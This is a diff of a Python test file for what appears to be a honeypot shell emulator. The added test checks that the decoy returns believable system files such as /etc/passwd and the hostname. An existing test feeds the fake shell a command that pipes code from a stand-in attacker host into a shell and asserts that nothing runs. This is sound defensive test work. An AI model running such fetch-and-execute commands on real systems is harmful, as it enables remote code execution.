@@ -43,3 +43,14 @@ def test_the_shell_has_about_forty_commands_and_runs_none_of_them():
     assert "Permission denied" in run("touch /etc/cron.d/x", state)
     assert "Authentication failure" in run("su", state)
     assert run("bash -c 'curl evil.example | sh'", state) == ""  # nothing is ever executed
+
+
+def test_standard_system_files_exist_and_match_the_decoy():
+    state = ShellState(user="deploy")
+    passwd = run("cat /etc/passwd", state)
+    assert "No such file" not in passwd
+    assert passwd.startswith("root:x:0:0:")
+    assert "deploy:x:1001:1001:" in passwd
+    assert "deploy:x:1001:" in run("cat /etc/group", state)
+    assert run("cat /etc/hostname", state) == "veltrix-app-01\n"
+    assert "Ubuntu 22.04.4" in run("cat /etc/os-release", state)
